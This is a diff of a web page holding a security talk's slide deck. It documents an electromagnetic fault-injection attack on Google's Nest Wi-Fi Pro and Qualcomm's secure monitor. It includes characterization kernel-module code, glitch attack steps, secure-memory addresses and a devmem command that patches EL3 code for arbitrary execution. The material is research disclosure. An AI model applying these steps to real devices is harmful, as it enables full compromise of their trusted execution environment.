+                        <li class="fragment custom blur" data-fragment-index="5">XYZ Table</li>
+                        <li class="fragment custom blur" data-fragment-index="6">EMFI Probe</li>
+                    </ul>
+            </ul>
+        </div>
+        <div style="flex: 5;">
+            <img src="images/communication.png" height="150px" class="fragment custom blur" data-fragment-index="1">
+            <img src="images/trigger.png" height="150px" class="fragment custom blur" data-fragment-index="2">
+            <img src="images/reset.png" height="150px" class="fragment custom blur" data-fragment-index="3">
+        </div>
+        <div style="flex: 5;">
+            <img src="images/spider.png" height="150px" class="fragment custom blur" data-fragment-index="4">
+            <br>
+            <img src="images/xyz.png" height="150px" class="fragment custom blur" data-fragment-index="5">
+            <br>
+            <img src="images/emfi.png" height="150px" class="fragment custom blur" data-fragment-index="6">
+        </div>
+    </div>
+</section>
+
+<!-- ------------------------------>
+<!-- Fault Injection Setup Diagram -->
+<!-- ------------------------------>
+
+<section>
+    <h4>Fault Injection Setup Diagram</h4>
+    <hr>
+    <img src="images/setup.png" height="500px">
+</section>
+
+<!-- ------------------------------>
+<!-- Fault Injection Setup Actual -->
+<!-- ------------------------------>
+
+<section>
+    <h4>Fault Injection Setup Actual</h4>
+    <hr>
+    <img src="images/setup2.png" height="500px">
+</section>
+
+<!-- ------------------------------>
+<!-- Let's start -->
+<!-- ------------------------------>
+
+<section>
+<p>Let's start glitching... &#128299;</p>
+</section>
+
+<!-- ------------------------------>
+<!-- Characterization -->
+<!-- ------------------------------>
+
+<section>
+    <h4>Characterization</h4>
+    <hr>
+    <ul>
+        <li class="fragment custom blur" data-fragment-index="1">Determine if the target is vulnerable</li>
+        <li class="fragment custom blur" data-fragment-index="2">Identify effective glitch parameters</li>
+        <ul class="fragment custom blur" data-fragment-index="2">
+            <li>Glitch power</li>
+            <li>Glitch location</li>
+        </ul>
+        <li class="fragment custom blur" data-fragment-index="3">Preferably the first step before performing an attack</li>
+    </ul>
+</section>
+
+<!-- ------------------------------>
+<!-- Characterization -->
+<!-- ------------------------------>
+
+<section>
+    <h4>Characterization: Code</h4>
+    <hr />
+    <div style="display: flex; align-items: center; gap: 0rem;">
+        <div style="flex: 3; font-size: 0.7em;">
+            <ul class="fragment custom blur" data-fragment-index="1">
+                <li>Implemented in a kernel module</li>
+                <li>Unrolled loop using <coder>add</coder> instructions</li>
+                <li>Trigger before and after instructions</li>
+            </ul>
+        </div>
+        <div style="flex: 3; font-size: 0.5em;" class="fragment custom blur" data-fragment-index="2">
+            <pre>
+                <code data-trim data-noescape>
+                    MODULE_DESCRIPTION(
+                        "CHARACTERIZATION 1 for Google's Nest Wi-Fi Pro"
+                    );
+
+                    #define o "add r7, r7, #1;"
+                    #define t o o o o o o o o o o
+                    #define h t t t t t t t t t t
+                    #define d h h h h h h h h h h
+                    #define x d d d d d d d d d d
+
+                    static int unrolled_loop(volatile u32 *trigger) {
+                        volatile u32 count = 0;
+
+                        *trigger = 0x3;
+
+                        asm volatile(
+                            "mov r7, #0;"
+                            x
+                            "mov %[count], r7;"
+
+                            : [count] "=r" (count) : : "r7", "r12"
+                        );
+
+                        *trigger = 0x0;
+
+                        printk(KERN_ALERT "AAAA%08xBBBB%08xCCCC\n", count, count);
+                        return 0;
+                    }
+                </code>
+            </pre>
+        </div>
+    </div>
+</section>
+
+<!-- ------------------------------>
+<!-- Characterization -->
+<!-- ------------------------------>
+
+<section>
+    <h4>Characterization: Execution</h4>
+    <hr />
+    <div style="font-size: 0.8em;">
+        <pre>
+            <code data-trim data-noescape>
+                # insmod characterize_1.ko _command=1 _iterations=10000
+                [ 1054.149388] characterize_1 (init)!
+                [ 1054.149491] AAAA00002710BBBB00002710CCCC
+                [ 1054.176611] characterize_1 (exit)!
+            </code>
+        </pre>
+        <p>We execute 0x2710 (10,000) add instructions.</p>
+    </div>
+</section>
+
+<!-- ------------------------------>
+<!-- Characterization -->
+<!-- ------------------------------>
+
+<section>
+    <h4>Characterization: Results</h4>
+    <hr />
+    <img src="images/xyz_plot.png" height="500px">
+</section>
+
+<section>
+    <h4>Characterization: Responses</h4>
+    <hr />
+    <div style="font-size: 0.8em;">
+        <pre>
+            <code data-trim data-noescape class="bash">
+                AAAA 00002710 BBBB 00002710 CCCC : expected (i.e., glitch has no impact)
+                AAAA 0000270f BBBB 0000270f CCCC : counter - 1
+                AAAA 00002790 BBBB 00002790 CCCC : counter + 0x80
+                AAAA 000027c0 BBBB 000027c0 CCCC : counter + 0xb0
+                AAAA 4000198e BBBB 4000198e CCCC : DDR address
+                AAAA 6fb91dac BBBB 6fb91dac CCCC : no idea
+            </code>
+        </pre>
+        <p>Above results indicate we may successfully alter instructions! &#129303;</p>
+    </div>
+</section>
+
+<!-- ------------------------------>
+<!-- What we achieved so far -->
+<!-- ------------------------------>
+<section>
+    <h4>What we achieved so far</h4>
+    <hr />
+
+    <div style="font-size: 1.0em">
+        <pre>
+            <code data-trim data-noescape class="language-C" data-line-numbers="6">
+                We can communicate via the serial interface
+                We can re-program the eMMC flash in place
+                We bypassed Secure Boot with a bug in U-Boot
+                - We enabled printing on the serial interface
+                - We start a root shell on the serial interface
+                We can corrupt instructions that are executed
+            </code>
+        </pre>
+    </div>
+</section>
+
+<section>
+<p>Our journey to EL3 code execution... &#128747;</p>
+</section>
+
+<section>
+    <h4>Fixing the probe</h4>
+    <hr />
+    <img src="images/probe_fixed.png" height="400px">
+    <p>Probe is fixed where we observed <coder>counter - 1</coder>! &#129504;</p>
+</section>
+
+<!-- ------------------------------>
+<!-- Executing SMC instructions -->
+<!-- ------------------------------>
+
+<section>
+    <h4>Executing SMC instructions </h4>
+    <hr>
+    <ul>
+        <li class="fragment custom blur" data-fragment-index="1">Requires kernel code execution</li>
+        <li class="fragment custom blur" data-fragment-index="2">We made a loadable kernel module (LKM)</li>
+    </ul>
+    <pre class="fragment custom blur" data-fragment-index="3">
+        <code data-trim data-noescape>
+            static int send_smc(u32 r0, u32 r1, u32 r2, ...) {
+                ...
+                asm volatile(
+                    ...
+                    ".arch_extension sec\n"
+                    "smc    #0      @ switch to secure world\n"
+                    ...
+                );
+                ...
+            }
+
+        </code>
+    </pre>
+    <ul class="fragment custom blur" data-fragment-index="4">
+        <li>We use this LKM to issue SMCs with any arguments</li>
+    </ul>
+
+</section>
+
+<section>
+    <h4>What we achieved so far</h4>
+    <hr />
+
+    <div style="font-size: 1.0em">
+        <pre>
+            <code data-trim data-noescape class="language-C" data-line-numbers="7">
+                We can communicate via the serial interface
+                We can re-program the eMMC flash in place
+                We bypassed Secure Boot with a bug in U-Boot
+                - We enabled printing on the serial interface
+                - We start a root shell on the serial interface
+                We can corrupt instructions that are executed
+                We can issue any smc with any arguments
+            </code>
+        </pre>
+    </div>
+</section>
+
+<section>
+    <h4>Secure Monitor: Interesting commands</h4>
+    <hr />
+    <div style="display: flex; align-items: center; gap: 0rem;">
+        <div style="flex: 3; font-size: 0.8em;" class="fragment custom blur" data-fragment-index="1">
+            <ul>
+                <li>REE uses SMCs to access (secure) registers</li>
+                <li>io_access_read (<coder>0x2000501</coder>)</li>
+                <ul>
+                    <li>used for reading registers</li>
+                </ul>
+                <li>io_access_write (<coder>0x2000502</coder>)</li>
+                <ul>
+                    <li>used for writing registers</li>
+                </ul>
+            </ul>
+        </div>
+        <div style="flex: 3; font-size: 0.6em;" class="fragment custom blur" data-fragment-index="2">
+            <pre>
+                <code data-trim data-noescape class="language-C">
+                    // io_access_read
+                    if (smcid == 0x2000501 )
+                    {
+                        v23 = el3_smc_read_from(smc_regs->x2);
+                        smc_regs->x0 = 0LL;
+                        smc_regs->x1 = v23;
+                        goto LABEL_62;
+                    }
+                </code>
+                <br/>
+                <code data-trim data-noescape class="language-C">
+                    // io_access_write
+                    if (smcid == 0x2000502 )
+                    {
+                        el3_smc_write_to(smc_regs->x2, smc_regs->x3);
+                        smc_regs->x0 = 0LL;
+                        smc_regs->x1 = 0LL;
+                        goto LABEL_62;
+                    }
+                </code>
+            </pre>
+        </div>
+    </div>
+    <p class="fragment custom blur" data-fragment-index="3">Arguments should be sanitized! &#129532;</p>
+</section>
+
+<section>
+    <h4>Secure Monitor: Restrictions</h4>
+    <hr />
+    <div style="display: flex; align-items: center; gap: 0rem;">
+        <div style="flex: 3; font-size: 0.8em;" class="fragment custom blur" data-fragment-index="1">
+            <ul>
+                <li>A <coder>white list</coder> with allowed addresses is used</li>
+                <li>Operation <coder>discarded</coder> when address is not on the whitelist</li>
+            </ul>
+        </div>
+        <div style="flex: 3; font-size: 0.6em;" class="fragment custom blur" data-fragment-index="2">
+            <pre>
+                <code data-trim data-noescape class="language-C" data-line-numbers="2">
+                    u32 el3_smc_read_from(uint32_t *address) {
+                        if ( is_allowed_address(address) == 1 ) {
+                            return *address;
+                        } else {
+                            return 0;
+                        }
+                    }
+                </code>
+                <br/>
+                <code data-trim data-noescape class="language-C" data-line-numbers="6">
+                    u32 is_allowed_address(uint32_t *address) {
+                        index = 0;
+                        for ( &allowed_addresses; ++allowed_addresses ) {
+                            if ( ++index > 7 )
+                                return 0;
+                            if (*allowed_addresses == address)
+                                break;
+                            }
+                        }
+                        return 1;
+                    }
+                </code>
+                <br/>
+                <code data-trim data-noescape class="language-C">
+                    LOAD:4AC084D0 allowed_addresses DCD 0x193D100
+                    LOAD:4AC084D4                   DCD 0xB1880B0
+                    LOAD:4AC084D8                   DCD 0xB1880B8
+                    LOAD:4AC084DC                   DCD 0xB1980B0
+                    LOAD:4AC084E0                   DCD 0xB1980B8
+                    LOAD:4AC084E4                   DCD 0x193D010
+                    LOAD:4AC084E8                   DCD 0x193D204
+                    LOAD:4AC084EC                   DCD 0x193D224
+                </code>
+            </pre>
+        </div>
+
+</section>
+
+<section>
+    <h4>Secure Monitor Attack: Steps</h4>
+    <hr />
+    <div style="display: flex; align-items: center; gap: 0rem;">
+        <div style="flex: 7; font-size: 0.8em;">
+            <ul>
+                <li class="fragment custom blur" data-fragment-index="1" >&#11165; Set trigger high </li>
+                <li class="fragment custom blur" data-fragment-index="1">Issue <coder>smc</coder> to read/write address (&#9889;)</li>
+                <li class="fragment custom blur" data-fragment-index="1">&#11167; Set trigger low</li>
+                <li class="fragment custom blur" data-fragment-index="2">When successful</li>
+                <ul>
+                    <li class="fragment custom blur" data-fragment-index="2">Read from an any address </li>
+                    <li class="fragment custom blur" data-fragment-index="2">Write any value to any address</li>
+                </ul>
+            </ul>
+        </div>
+        <div style="flex: 3; font-size: 0.6em;" class="fragment custom blur" data-fragment-index="2">
+            <pre>
+                <code data-trim data-noescape class="language-C">
+                    // Glitched version of io_access_read
+                    u32 el3_smc_read_from(u32 *address) {
+                        value = *address;
+                        return value;
+                    }
+                </code>
+                <br/>
+                <code data-trim data-noescape class="language-C">
+                    // Glitched version of io_access_write
+                    u32 el3_smc_write_to(u32 *address, u32 value) {
+                        *address = value;
+                        return 0LL;
+                    }
+                </code>
+            </pre>
+        </div>
+    </div>
+</section>
+
+<section>
+    <h4>Secure Monitor Attack: Timing</h4>
+    <hr />
+    <img src="images/timing_io_read_invalid.png" width="100%" >
+    <p>The &#9889; is injected in a 5 &#181;s window with ~350 ns jitter!</p>
+</section>
+
+<section>
+    <h4>Secure Monitor Attack: Reading</h4>
+    <hr />
+    <img src="images/read_results_plot.png" width="100%">
+    <ul>
+        <li>Success rate ~0.1% (or 1 success every 30 minutes)</li>
+        <li>But, successful glitches are in specific areas</li>
+    </ul>
+</section>
+
+<section>
+    <p>What about writing (i.e., <coder>io_access_write</coder>)?</p>
+</section>
+
+<section>
+    <h4>Secure Monitor Attack: Writing</h4>
+    <hr />
+    <img src="images/write_results_plot.png" width="100%">
+    <ul>
+        <li>Success rate ~0.3% (or 1 success every 10 minutes)</li>
+        <li>Reused knowledge from the previous experiment</li>
+    </ul>
+</section>
+
+<section>
+    <h4>What we achieved so far</h4>
+    <hr />
+
+    <div style="font-size: 1.0em">
+        <pre>
+            <code data-trim data-noescape class="language-C" data-line-numbers="8-10">
+                We can communicate via the serial interface
+                We can re-program the eMMC flash in place
+                We bypassed Secure Boot with a bug in U-Boot
+                - We enabled printing on the serial interface
+                - We start a root shell on the serial interface
+                We can corrupt instructions that are executed
+                We can issue any smc with any arguments
+                From within the context of the Secure Monitor (EL3)
+                - We can R from any address using a glitch
+                - We can W to any address using a glitch
+            </code>
+        </pre>
+    </div>
+</section>
+
+<section>
+    <p>Let's get code execution (at EL3) &#129398;</p>
+</section>
+
+<section>
+    <h4>Qualcomm's Memory Protection: xPU</h4>
+    <hr />
+    <ul>
+        <li class="fragment custom blur" data-fragment-index="1">Qualcomm uses proprietrary hardware to protect the access to memory and peripherals</li>
+        <li class="fragment custom blur" data-fragment-index="2">Can be (re-)conifgured during boot & runtime</li>
+        <li class="fragment custom blur" data-fragment-index="3">Each xPU has its own dedicated registers</li>
+        <li class="fragment custom blur" data-fragment-index="4">Use case:</li>
+        <ul>
+            <li class="fragment custom blur" data-fragment-index="4">Block Linux from accessing secure memory</li>
+            <li class="fragment custom blur" data-fragment-index="4">Block Linux from accessing secure peripherals</li>
+            <li class="fragment custom blur" data-fragment-index="4">...</li>
+        </ul>
+    </ul>
+</section>
+
+<section>
+    <h4>Dumping the DDR xPU config</h4>
+    <hr />
+    <div style="font-size: 0.6em; align-items: center;">
+        <p class="fragment custom blur" data-fragment-index="1">Dumping the config to a log file</p>
+        <pre class="fragment custom blur" data-fragment-index="1">
+            <code data-trim data-noescape class="language-bash">
+                / # devmem 0x4ac00000
+                [ 226.334018] WARN: Access Violation!!!
+                [ 226.334018] Run "cat /sys/kernel/debug/qti_debug_logs/tz_log" for more details
+                Bus error (core dumped)
+                / #
+            </code>
+        </pre>
+        <p class="fragment custom blur" data-fragment-index="2">Dumping the config to a log file</p>
+        <pre class="fragment custom blur" data-fragment-index="2">
+            <code data-trim data-noescape class="language-bash">
+                / # tail /sys/kernel/debug/qti_debug_logs/tz_log -n 36
+                [1c0032308c]XPU ERROR: Non Sec!!
+                [1c0032412a]xpu:>>> [4] XPU error dump, XPU id 4 (DDR0_MPU)<<<
+                [1c003290cb] xpu: uPhysicalAddress: 4ac00000
+                xpu: uAMemType: 00000000
+                xpu: Prt: 0: Start: 0x40000000, End: 0x4ac00000, Perm0: 0xffffffff, Perm1: 0xffff, Cfg: 0x1
+                xpu: Prt: 1: Start: 0x4ac00000, End: 0x4ad11000, Perm0: 0x0, Perm1: 0x0, Cfg: 0x0
+                xpu: Prt: 2: Start: 0x4ad11000, End: 0x4ad12000, Perm0: 0xc0, Perm1: 0x0, Cfg: 0x0
+                xpu: Prt: 3: Start: 0x4ad12000, End: 0x4ad14000, Perm0: 0x0, Perm1: 0x0, Cfg: 0x0
+                xpu: Prt: 4: Start: 0x4ad14000, End: 0x4ad15000, Perm0: 0x55555555, Perm1: 0x5555, Cfg: 0x0
+                xpu: Prt: 5: Start: 0x4ad15000, End: 0x4ad16000, Perm0: 0x0, Perm1: 0x0, Cfg: 0x0
+                xpu: Prt: 6: Start: 0x4ad16000, End: 0x4ad8b000, Perm0: 0xc0, Perm1: 0x0, Cfg: 0x1
+                xpu: Prt: 7: Start: 0x4ad8b000, End: 0x7ffff000, Perm0: 0xffffffff, Perm1: 0xffff, Cfg: 0x1
+                ...
+                / #
+            </code>
+        </pre>
+        <p class="fragment custom blur" data-fragment-index="3">Secure Memory (EL3/S-EL1) is present in <coder>0x4ac00000 - 0x4ad11000</coder> (i.e., Prt 1)</p>
+    </div>
+
+</section>
+
+<section>
+    <h4>XPU configuration register</h4>
+    <hr />
+    <ul>
+        <li class="fragment custom blur" data-fragment-index="1">Address found by reversing the qsee binary</li>
+        <ul>
+            <li class="fragment custom blur" data-fragment-index="1">Contains a table with all available xPU registers</li>
+        </ul>
+        <li class="fragment custom blur" data-fragment-index="2">Address for <coder>DDR0_MPU</coder> is <coder>0x6e000</coder></li>
+        <li class="fragment custom blur" data-fragment-index="3">After a bit of peeking we figured out that</li>
+        <ul>
+            <li class="fragment custom blur" data-fragment-index="3">Start for <coder>Prt 1</coder> is @ <coder>0x6e000 + 0x200 + 0x2c0</coder></li>
+            <li class="fragment custom blur" data-fragment-index="3">End for <coder>Prt 1</coder> is @ <coder>0x6e000 + 0x200 + 0x2c8</coder></li>
+        </ul>
+    </ul>
+    <p class="fragment custom blur" data-fragment-index="4">What if we write to <coder>Start</coder>? Let's find out! &#128579;</p>
+</section>
+
+<section>
+    <h4>XPU attack: Steps </h4>
+    <hr />
+    <div style="display: flex; align-items: center; gap: 0rem;">
+        <div style="flex: 5; font-size: 0.7em;" class="fragment custom blur" data-fragment-index="1">
+            <ul>
+                <li>&#11165; Set trigger high </li>
+                <li>Issue <coder>smc</coder> to write <coder>0x4ac09000</coder> to <coder>Start</coder> of <coder>Prt 1</coder> (&#9889;)</li>
+                <li>&#11167; Set trigger low</li>
+                <li>Read from <coder>0x4ac00000</coder> using <coder>devmem</coder></li>
+            </ul>
+        </div>
+        <div style="flex: 5; font-size: 0.6em;" class="fragment custom blur" data-fragment-index="2">
+            <p>On fail we get:</p>
+            <pre>
+                <code data-trim data-noescape class="language-bash">
+                    / # devmem 0x4ac00000
+                    [ 226.321780] Unhandled fault
+                    [ 226.334018] WARN: Access Violation!!!
+                    Bus error (core dumped)
+                </code>
+            </pre>
+            <p>On success we got:</p>
+            <pre>
+                <code data-trim data-noescape class="language-bash">
+                    / # devmem 0x4ac00000
+                    0xD29FFFE1
+                </code>
+            </pre>
+        </div>
+    </div>
+    <p class="fragment custom blur" data-fragment-index="3">We can access <coder>Secure Memory</coder> from our root shell! &#128128;</p>
+</section>
+
+<!-- <section>
+    <h4>XPU attack: Results </h4>
+    <hr />
+    <img src="images/xpu_results_plot.png" width="100%">
+    <ul>
+        <li>Success rate ~0.0% (or 1 success every 10 minutes)</li>
+        <li>Re-used knowledge from previous experiments</li>
+    </ul>
+</section> -->
+
+<section>
+    <h4>What we achieved so far</h4>
+    <hr />
+
+    <div style="font-size: 1.0em">
+        <pre>
+            <code data-trim data-noescape class="language-C" data-line-numbers="11">
+                We can communicate via the serial interface
+                We can re-program the eMMC flash in place
+                We bypassed Secure Boot with a bug in U-Boot
+                - We enabled printing on the serial interface
+                - We start a root shell on the serial interface
+                We can corrupt instructions that are executed
+                We can issue any smc with any arguments
+                From within the context of the Secure Monitor (EL3)
+                - We can R from any address using a glitch
+                - We can W to any address using a glitch
+                We can RW Secure Memory from Linux (NS-EL0)
+            </code>
+        </pre>
+    </div>
+</section>
+
+<section>
+    <h4>Code Exection (EL3)</h4>
+    <hr />
+    <div style="display: flex; align-items: center; gap: 0rem;">
+        <div style="flex: 1; font-size: 0.7em;">
+            <ul>
+                <li class="fragment custom blur" data-fragment-index="1">From our root shell we can:</li>
+                <ul>
+                    <li class="fragment custom blur" data-fragment-index="1">Read Secure Memory</li>
+                    <li class="fragment custom blur" data-fragment-index="1">Write Secure memory</li>
+                </ul>
+                <li class="fragment custom blur" data-fragment-index="2">We can also patch EL3 code directly</li>
+                <ul>
+                    <li class="fragment custom blur" data-fragment-index="2">E.g., patch <coder>is_allowed_address</coder> until reset (&#128584;)</li>
+                </ul>
+            </ul>
+
+        </div>
+        <div style="flex: 1; font-size: 0.6em;" class="fragment custom blur" data-fragment-index="3">
+            <pre>
+            <code data-trim data-noescape class="language-C" data-line-numbers="5">
+                u32 is_allowed_address(uint32_t *address) {
+                    index = 0;
+                    for ( &allowed_addresses; ++allowed_addresses ) {
+                        if ( ++index > 7 )
+                            return 0;
+                        if (*allowed_addresses == address)
+                            break;
+                        }
+                    }
+                    return 1;
+                }
+            </code>
+            </pre>
+            <pre>
+            <code data-trim data-noescape class="language-bash">
+                / # devmem 0x4ac031f0 32 0x320003e0
+            </code>
+            </pre>
+
+            <pre>
+            <code data-trim data-noescape class="language-C" data-line-numbers="3">
+                u32 is_allowed_address(uint32_t *address) {
+                    index = 0;
+                    for ( &allowed_addresses; ++allowed_addresses ) {
+                        if ( ++index > 7 )
+                            return 1;
+                        if (*allowed_addresses == address)
+                            break;
+                        }
+                    }
+                    return 1;
+                }
+            </code>
+            </pre>
+        </div>
+    </div>
+</section>
+
+<section>
+    <h4>What <coder>finally</coder> achieved &#129495;</h4>
+    <hr />
+
+    <div style="font-size: 1.0em">
+    <pre>
+        <code data-trim data-noescape class="language-C" data-line-numbers="12">
+            We can communicate via the serial interface
+            We can re-program the eMMC flash in place
+            We bypassed Secure Boot with a bug in U-Boot
+              - We enabled printing on the serial interface
+              - We start a root shell on the serial interface
+            We can corrupt instructions that are executed
+            We can issue any smc with any arguments
+            From within the context of the Secure Monitor (EL3)
+              - We can R from any address using a glitch
+              - We can W to any address using a glitch
+            We can RW Secure Memory from Linux (NS-EL0)
+            We can patch EL3 code directly from Linux (NS-EL0)
+        </code>
+    </pre>
+    <p class="fragment custom blur" data-fragment-index="1">Hence, we can execute arbitrary code! &#128081;</p>
+    </div>
+
+    </script>
+
+
+</section>
+
+<section>
+    <h4>Video Demonstration &#127916;</h4>
+    <hr />
+    <div style="padding:56.25% 0 0 0;position:relative;"><iframe src="https://player.vimeo.com/video/1016076363?h=ac3354be55&amp;badge=0&amp;autopause=0&amp;player_id=0&amp;app_id=58479" frameborder="0" allow="autoplay; fullscreen; picture-in-picture; clipboard-write; encrypted-media; web-share" style="position:absolute;top:0;left:0;width:100%;height:100%;" title="Google Wifi Pro: Arbitrary Code Execution at EL3 using EMFI"></iframe></div><script src="https://player.vimeo.com/api/player.js"></script>
+</section>
+
+<section>
+    <h4>Takeaways</h4>
+    <hr />
+    <div style="font-size: 0.8em">
+        <ul>
+            <li class="fragment custom blur" data-fragment-index="1">FI attacks are</li>
+            <ul>
+                <li class="fragment custom blur" data-fragment-index="1">very powerful when combined with other attacks</li>
+                <li class="fragment custom blur" data-fragment-index="1">effective against secure subsystems like TEEs</li>
+            </ul>
+            <li class="fragment custom blur" data-fragment-index="2">Modern TEEs rely (often) on single point of failures</li>
+            <ul >
+                <li class="fragment custom blur" data-fragment-index="2">i.e., a single write leads to a full compromise</li>
+            </ul>
+            <li class="fragment custom blur" data-fragment-index="3">Many 'secure' devices are not hardened against glitches</li>
+        </ul>
+    </div>
+</section>
+
+<section>
+    <h4>Conclusion</h4>
+    <hr />
+    <div style="font-size: 0.8em">
+        <ul>
+            <li class="fragment custom blur" data-fragment-index="1">Google's Wifi Pro is vulnerable to FI attacks</li>
+            <ul>
+                <li class="fragment custom blur" data-fragment-index="1">Qualcomm's IPQ5018 SoC is vulnerable to FI attacks</li>
+                <li class="fragment custom blur" data-fragment-index="1">Qualcomm's QSEE is not hardened against FI attacks</li>
+            </ul>
+            <li class="fragment custom blur" data-fragment-index="2">Escalating from root to EL3 with a glitch (&#9889;) may not that difficult</li>
+        </ul>
+    </div>
+</section>
+
+<section>
+    <h4>Thank you! Any questions!?</h4>
+    <hr>
+        <p>
+        <small>
+            Niek Timmers
+            <br>
+            ( <a href="mailto:niek@raelize.com">niek@raelize.com</a> )
+        </small>
+    </p>
+</section>
+
+
+<!-- END -->
+</div>
+</div>
+
+<script src="dist/reveal.js"></script>
+<script src="plugin/notes/notes.js"></script>
+<script src="plugin/markdown/markdown.js"></script>
+<script src="plugin/highlight/highlight.js"></script>
+
+<script>
+// More info about initialization & config:
+// - https://revealjs.com/initialization/
+// - https://revealjs.com/config/
+
+// Full list of configuration options available here:
+// https://github.com/hakimel/reveal.js#configuration
+
+    Reveal.initialize({
+        hash: true,
+        fragments: true,
+        slideNumber: 'c/t',
+        // width: "45%",
+        // height: "45%",
+        // margin: 0.10,
+        // Learn about plugins: https://revealjs.com/plugins/
+        highlight: {
+          theme: 'monokai'
+        },
+        markdown: {
+            smartypants: false,
+            breaks: false,
+        },
+        transition: 'convex',
+        plugins: [ RevealMarkdown, RevealHighlight, RevealNotes ]
+    });
+    Reveal.configure({ backgroundTransition: 'zoom' })
+    Reveal.configure({ pdfSeparateFragments: false });
+
+</script>
+
+</body>
+</html>
+</div>
+                
+
+                
+                
+            </div>
+        </div>
+    </div>
+</section>
+
+
+  </div><!-- end Contact Area -->
+<footer id="footer" class="section-bg">
+	<div class="container">
+		<div class="row wow fadeInUp" data-wow-duration="500ms">
+			<div class="col-xl-12">
+
+				<!-- Footer Social Links -->
+				<div class="social-icon">
+					<ul class="list-inline">
+						
+						<li class="list-inline-item"><a href="https://twitter.com/raelizecom" rel="nofollow"><i class="ti-twitter-alt"></i></a></li>
+						
+						<li class="list-inline-item"><a href="https://www.linkedin.com/company/raelize" rel="nofollow"><i class="ti-linkedin"></i></a></li>
+						
+					</ul>
+				</div>
+
+				<!-- copyright -->
+				<div class="copyright text-center">
+					<a href="https://raelize.com/">
+						<img src="https://raelize.com/images/logo.png" alt="Raelize - Embedded Device Security Services Consultancy Testing Research Training" height="42" />
+					</a>
+					<br>
+					<p>Copyright ©2020 Raelize B.V. <br> Powered by <a href=#>Hugo</a> and <a href="https://themefisher.com">Themefisher</a>.</p>
+				</div>
+			</div>
+		</div>
+	</div>
+</footer>
+<!-- /footer -->
+
+<!-- Google Map API -->
+
+
+<!-- JS Plugins -->
+
+<script src="https://raelize.com/plugins/jquery/jquery.min.js"></script>
+
+<script src="https://raelize.com/plugins/bootstrap/bootstrap.min.js"></script>
+
+<script src="https://raelize.com/plugins/slick/slick.min.js"></script>
+
+<script src="https://raelize.com/plugins/shuffle/shuffle.min.js"></script>
+
+<script src="https://raelize.com/plugins/magnific-popup/jquery.magnific-popup.min.js"></script>
+
+<script src="https://raelize.com/plugins/lazy-load/lozad.min.js"></script>
+
+<script src="https://raelize.com/plugins/google-map/map.js"></script>
+
+
+<!-- Main Script -->
+
+<script src="https://raelize.com/js/script.min.30c5d71cc6d4427af95614c557ab5b3e327ad2aa865d9c4cb3e3af601bd051948abde36c96cad1b4cb71909318d0e18c.js" integrity="sha384-MMXXHMbUQnr5VhTFV6tbPjJ60qqGXZxMs&#43;OvYBvQUZSKveNslsrRtMtxkJMY0OGM"></script>
+
+
+</body>
+
+</html>
